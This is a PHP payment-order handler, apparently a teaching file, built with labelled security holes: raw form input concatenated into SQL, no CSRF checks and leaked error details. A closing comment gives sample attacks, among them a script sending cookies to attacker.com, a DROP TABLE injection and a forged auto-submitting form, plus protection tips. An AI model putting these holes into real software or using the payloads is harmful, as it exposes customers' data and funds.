<?php
session_start();
require_once 'config/database.php';

// VULNERABILITY 1: No CSRF Protection
// Attackers can forge requests from other sites

// VULNERABILITY 2: No Input Sanitization
// XSS and SQL Injection possible
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $full_name = $_POST['full_name'];
    $email = $_POST['email'];
    $phone = $_POST['phone'];
    $address = $_POST['address'];
    $city = $_POST['city'];
    $postal_code = $_POST['postal_code'];
    $crypto_type = $_POST['crypto_type'];
    $wallet_address = $_POST['wallet_address'];
    $network = $_POST['network'];

    // VULNERABILITY 3: Predictable Order ID
    $order_id = 'ORD-' . time();

    // VULNERABILITY 4: SQL Injection Possible
    $sql = "INSERT INTO orders (order_id, full_name, email, phone, address, city, postal_code, crypto_type, wallet_address, network, status, created_at) 
           VALUES ('$order_id', '$full_name', '$email', '$phone', '$address', '$city', '$postal_code', '$crypto_type', '$wallet_address', '$network', 'pending', NOW())";

    try {
        // VULNERABILITY 5: No Database Connection Security
        $db = new PDO(
            "mysql:host=" . DB_HOST . ";dbname=" . DB_NAME,
            DB_USER,
            DB_PASS
        );
        $db->query($sql);

        $success = true;
        $order_summary = [
            'order_id' => $order_id,
            'full_name' => $full_name,
            'email' => $email,
            'crypto_type' => $crypto_type,
            'network' => $network
        ];

        // Return JSON response
        header('Content-Type: application/json');
        echo json_encode([
            'success' => true,
            'order_id' => $order_id,
            'payment_address' => 'bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh', // VULNERABILITY 6: Hardcoded Payment Address
            'amount' => '259 JOD',
            'currency' => $crypto_type,
            'network' => $network
        ]);

    } catch (Exception $e) {
        // VULNERABILITY 7: Detailed Error Messages
        header('Content-Type: application/json');
        echo json_encode([
            'success' => false,
            'error' => $e->getMessage(),
            'file' => $e->getFile(),
            'line' => $e->getLine()
        ]);
    }
}

/**
 * Example of how these vulnerabilities could be exploited:
 * 
 * 1. XSS Attack:
 *    <script>document.location='http://attacker.com/steal?cookie='+document.cookie</script>
 * 
 * 2. SQL Injection:
 *    '; DROP TABLE orders; --
 * 
 * 3. CSRF Attack:
 *    <form action="http://vulnerable-site.com/process_payment.php" method="POST">
 *      <input type="hidden" name="full_name" value="Attacker">
 *      <input type="hidden" name="email" value="attacker@evil.com">
 *      <input type="hidden" name="wallet_address" value="attacker_wallet">
 *    </form>
 *    <script>document.forms[0].submit()</script>
 * 
 * 4. Payment Address Manipulation:
 *    Modify the hardcoded payment address
 * 
 * PROTECTION MEASURES:
 * 
 * 1. Use prepared statements
 * 2. Implement CSRF tokens
 * 3. Sanitize all input
 * 4. Use secure headers
 * 5. Implement rate limiting
 * 6. Use secure session handling
 * 7. Validate all data
 * 8. Use proper error handling
 * 9. Implement proper logging
 * 10. Use secure database connections
 */
?> 